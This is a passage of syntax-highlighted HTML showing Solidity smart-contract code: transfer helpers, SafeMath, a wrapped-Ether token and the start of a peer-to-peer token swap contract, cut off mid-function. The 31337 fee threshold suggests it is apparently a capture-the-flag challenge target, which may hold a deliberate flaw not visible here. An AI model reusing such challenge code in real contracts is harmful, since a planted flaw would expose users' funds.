operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'TransferHelper::safeTransfer: transfer failed'</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> token<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x23b872dd</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            success <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'TransferHelper::transferFrom: transferFrom failed'</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeTransferETH</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> to<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> value<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">'TransferHelper::safeTransferETH: ETH transfer failed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">>=</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">>=</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">*</span> b<span class=\"token punctuation\">;</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> c <span class=\"token operator\">/</span> a <span class=\"token operator\">==</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> c <span class=\"token operator\">=</span> a <span class=\"token operator\">/</span> b<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">P2P_WETH</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name     <span class=\"token operator\">=</span> <span class=\"token string\">\"P2P SwapWrapped Ether\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> symbol   <span class=\"token operator\">=</span> <span class=\"token string\">\"P2PETH\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint8</span>  <span class=\"token keyword\">public</span> decimals <span class=\"token operator\">=</span> <span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span>  <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> guy<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span>  <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> dst<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span>  <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> dst<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span>  <span class=\"token function\">Withdrawal</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span>                       <span class=\"token keyword\">public</span>  balanceOf<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token keyword\">public</span>  allowance<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint</span> wad\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Withdrawal</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> guy<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> wad\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        allowance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>guy<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> wad<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> guy<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> dst<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> wad\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> src<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> dst<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> wad\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceOf<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>src <span class=\"token operator\">!=</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">&amp;&amp;</span> allowance<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">**</span> <span class=\"token number\">256</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>allowance<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            allowance<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> wad<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        balanceOf<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balanceOf<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balanceOf<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>    \n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IP2P_WETH</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">P2PSwapper</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Deal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> initiator<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">address</span> bidToken<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> bidPrice<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">address</span> askToken<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> askAmount<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> status<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">enum</span> <span class=\"token class-name\">DealState</span> <span class=\"token punctuation\">&#123;</span>\n        Active<span class=\"token punctuation\">,</span>\n        Succeeded<span class=\"token punctuation\">,</span>\n        Canceled<span class=\"token punctuation\">,</span>\n        Withdrawn\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">NewUser</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> user<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> id<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> partnerId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">WithdrawFees</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> partner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> userId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">NewDeal</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> bidToken<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> bidPrice<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> askToken<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> askAmount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> dealId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">TakeDeal</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> dealId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> bidder<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">CancelDeal</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> dealId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> dealCount<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> <span class=\"token operator\">=></span> Deal<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> deals<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> _dealHistory<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> userCount<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> partnerFees<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> distributedFees<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> partnerById<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> userByAddress<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> addressById<span class=\"token punctuation\">;</span>\n\n    IP2P_WETH <span class=\"token keyword\">public</span> immutable p2pweth<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> weth<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        p2pweth <span class=\"token operator\">=</span> <span class=\"token function\">IP2P_WETH</span><span class=\"token punctuation\">(</span>weth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        userByAddress<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        addressById<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        partnerById<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">private</span> entered <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">nonReentrant</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>entered <span class=\"token operator\">==</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'P2PSwapper: re-entrancy detected!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        entered <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n        entered <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">createDeal</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> bidToken<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> bidPrice<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> askToken<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> askAmount\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> dealId<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> fee <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>fee <span class=\"token operator\">></span> <span class=\"token number\">31337</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"P2PSwapper: fee too low\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        p2pweth<span class=\"token 